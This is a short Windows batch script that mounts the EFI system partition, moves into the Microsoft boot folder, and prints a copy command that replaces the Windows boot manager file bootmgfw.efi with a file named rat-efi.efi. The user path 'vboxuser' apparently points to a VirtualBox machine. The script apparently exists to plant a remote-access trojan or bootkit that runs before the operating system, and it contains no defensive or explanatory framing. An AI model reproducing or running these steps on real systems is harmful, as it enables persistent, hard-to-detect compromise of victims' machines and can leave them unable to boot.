@echo off

mountvol S: /s
cd /d S:\EFI\Microsoft\Boot
cls
echo Copy template: copy C:\Users\vboxuser\Desktop\rat-efi.efi bootmgfw.efi
cmd
